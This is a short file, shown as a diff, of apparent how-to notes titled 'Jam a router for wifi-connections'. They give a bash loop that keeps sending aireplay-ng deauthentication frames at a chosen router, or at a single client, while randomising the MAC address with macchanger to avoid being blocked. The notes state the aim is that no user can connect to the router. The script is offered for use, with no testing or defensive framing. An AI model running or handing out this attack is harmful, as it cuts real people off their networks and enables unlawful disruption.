@@ -1,0 +1,19 @@
+Jam a router for wifi-connections
+
+1. Make a bash script like below 
+	while true
+	do
+		aireplay-ng -0 5 -a [router bssid] -c [client bssid] wlan0mon
+		ifconfig wlan0 down
+		macchanger -r wlan0 | grep "New MAC"
+		iwconfig wlan0 mode monitor
+		ifconfig wlan0 up | grep Mode
+		sleep 3
+		echo Waiting!!!!!
+	done
+
+
+2. client bssid is optional unless you want to target a perticular target
+
+this will send deauth signal to router so none of the user able to connect
+to that router
